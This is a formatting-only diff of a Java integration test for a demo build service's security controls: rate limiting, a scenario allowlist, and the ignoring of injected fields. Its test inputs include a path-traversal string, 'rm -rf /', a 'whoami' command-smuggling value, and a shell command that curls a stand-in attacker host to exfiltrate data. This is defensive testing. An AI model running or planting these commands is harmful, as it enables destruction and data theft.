@@ -37,7 +37,8 @@ class PublicDemoSecurityIntegrationTest extends ControlPlaneIntegrationTest {
         registry.add("forge.demo.warmup.enabled", () -> "false");
     }
 
-    private static final ParameterizedTypeReference<Map<String, Object>> JSON_OBJECT = new ParameterizedTypeReference<>() {};
+    private static final ParameterizedTypeReference<Map<String, Object>> JSON_OBJECT =
+            new ParameterizedTypeReference<>() {};
 
     @Autowired private TestRestTemplate rest;
     @Autowired private StringRedisTemplate redis;
@@ -55,10 +56,16 @@ class PublicDemoSecurityIntegrationTest extends ControlPlaneIntegrationTest {
 
     @Test
     void aSecondGuestBuildFromTheSameClientInsideTheWindowIsRateLimited() {
-        assertThat(startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2)).getStatusCode()).isEqualTo(HttpStatus.CREATED);
-        redis.delete("forge:demo:build-lock"); // isolate the rate limit from the one-build-at-a-time lock
+        assertThat(
+                        startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2))
+                                .getStatusCode())
+                .isEqualTo(HttpStatus.CREATED);
+        redis.delete(
+                "forge:demo:build-lock"); // isolate the rate limit from the one-build-at-a-time
+        // lock
 
-        ResponseEntity<Map<String, Object>> tooFast = startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2));
+        ResponseEntity<Map<String, Object>> tooFast =
+                startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2));
 
         assertThat(tooFast.getStatusCode()).isEqualTo(HttpStatus.TOO_MANY_REQUESTS);
         assertThat(tooFast.getBody()).containsEntry("error", "demo_busy");
@@ -66,17 +73,24 @@ class PublicDemoSecurityIntegrationTest extends ControlPlaneIntegrationTest {
 
     @Test
     void aScenarioIdOutsideTheAllowlistIsRejected() {
-        for (String forged : new String[] {"../../etc/passwd", "rm -rf /", "custom-scenario", "no-change; whoami"}) {
-            ResponseEntity<Map<String, Object>> response = startDemoBuild(Map.of("scenario", forged, "workerCount", 1));
+        for (String forged :
+                new String[] {
+                    "../../etc/passwd", "rm -rf /", "custom-scenario", "no-change; whoami"
+                }) {
+            ResponseEntity<Map<String, Object>> response =
+                    startDemoBuild(Map.of("scenario", forged, "workerCount", 1));
 
-            assertThat(response.getStatusCode()).as("scenario %s", forged).isEqualTo(HttpStatus.BAD_REQUEST);
+            assertThat(response.getStatusCode())
+                    .as("scenario %s", forged)
+                    .isEqualTo(HttpStatus.BAD_REQUEST);
             clearGuestLimits();
         }
     }
 
     @Test
     void aBlankScenarioIsRejectedBeforeAnythingRuns() {
-        ResponseEntity<Map<String, Object>> response = startDemoBuild(Map.of("scenario", "", "workerCount", 1));
+        ResponseEntity<Map<String, Object>> response =
+                startDemoBuild(Map.of("scenario", "", "workerCount", 1));
 
         assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
     }
@@ -85,39 +99,56 @@ class PublicDemoSecurityIntegrationTest extends ControlPlaneIntegrationTest {
     void aGuestCannotSmuggleACommandRepositoryOrImageIntoTheBuildItStarts() {
         Map<String, Object> hostile =
                 Map.of(
-                        "scenario", "leaf-module",
-                        "workerCount", 2,
-                        "command", java.util.List.of("/bin/sh", "-c", "curl attacker.example/exfil"),
-                        "repoUrl", "git@github.com:attacker/payload.git",
-                        "image", "attacker/image:latest",
-                        "tasks", java.util.List.of("attacker:task"));
+                        "scenario",
+                        "leaf-module",
+                        "workerCount",
+                        2,
+                        "command",
+                        java.util.List.of("/bin/sh", "-c", "curl attacker.example/exfil"),
+                        "repoUrl",
+                        "git@github.com:attacker/payload.git",
+                        "image",
+                        "attacker/image:latest",
+                        "tasks",
+                        java.util.List.of("attacker:task"));
 
         ResponseEntity<Map<String, Object>> injected = startDemoBuild(hostile);
         assertThat(injected.getStatusCode()).isEqualTo(HttpStatus.CREATED);
-        Set<?> injectedTasks = Set.copyOf((java.util.List<?>) injected.getBody().get("baselineTasks"));
+        Set<?> injectedTasks =
+                Set.copyOf((java.util.List<?>) injected.getBody().get("baselineTasks"));
 
         clearGuestLimits();
-        ResponseEntity<Map<String, Object>> clean = startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2));
+        ResponseEntity<Map<String, Object>> clean =
+                startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2));
         Set<?> cleanTasks = Set.copyOf((java.util.List<?>) clean.getBody().get("baselineTasks"));
 
-        // the extra fields have no binding target at all: the build is byte-for-byte the bundled one
+        // the extra fields have no binding target at all: the build is byte-for-byte the bundled
+        // one
         assertThat(injectedTasks).isEqualTo(cleanTasks);
-        assertThat(injectedTasks).allSatisfy(task -> assertThat(task.toString()).doesNotContain("attacker"));
+        assertThat(injectedTasks)
+                .allSatisfy(task -> assertThat(task.toString()).doesNotContain("attacker"));
     }
 
     @Test
     void aGuestCannotCrashAWorkerOnABuildThatIsNotRunningAnything() {
-        ResponseEntity<Map<String, Object>> started = startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2));
+        ResponseEntity<Map<String, Object>> started =
+                startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2));
         Number buildId = (Number) started.getBody().get("incrementalBuildId");
 
-        // no worker is registered in this suite, so nothing is running and there is nothing to crash
+        // no worker is registered in this suite, so nothing is running and there is nothing to
+        // crash
         ResponseEntity<Map<String, Object>> response =
-                rest.exchange("/api/demo/builds/" + buildId + "/crash-worker", HttpMethod.POST, HttpEntity.EMPTY, JSON_OBJECT);
+                rest.exchange(
+                        "/api/demo/builds/" + buildId + "/crash-worker",
+                        HttpMethod.POST,
+                        HttpEntity.EMPTY,
+                        JSON_OBJECT);
 
         assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CONFLICT);
     }
 
     private ResponseEntity<Map<String, Object>> startDemoBuild(Map<String, Object> body) {
-        return rest.exchange("/api/demo/builds", HttpMethod.POST, new HttpEntity<>(body), JSON_OBJECT);
+        return rest.exchange(
+                "/api/demo/builds", HttpMethod.POST, new HttpEntity<>(body), JSON_OBJECT);
     }
 }
